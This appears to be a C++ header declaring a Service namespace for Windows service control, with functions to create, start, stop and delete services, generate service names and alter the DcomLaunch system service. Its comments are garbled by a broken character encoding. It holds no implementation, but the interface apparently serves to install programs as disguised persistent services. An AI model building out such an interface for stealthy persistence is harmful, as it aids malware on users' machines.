#pragma once

#include "core.h"

namespace Service
{

bool Start( const char* name );
bool Stop( const char* name );
bool Delete( const char* name );
bool GetFileName( const char* name, StringBuilder& fileName );
//������������� ����� ������ dcomlaunch �� ����������� �� ����������� �����-���� ������ 
bool OffDcomlaunch();
//��������� ��� ��� ��������� ������ �������
bool CreateNameService( StringBuilder& name, StringBuilder& displayName );
//�� ���� ����� ������� PathExe ���� ��� �������, ��� ����� ����� ���������� � ������ ��������
bool GetNameService( StringBuilder& name, const StringBuilder& pathExe );
//�������� �������
bool Create( const StringBuilder& fileName, const StringBuilder& nameService, const StringBuilder& displayName );
//��� ���������� ������
bool SetStartType( const char* name, DWORD type );

}
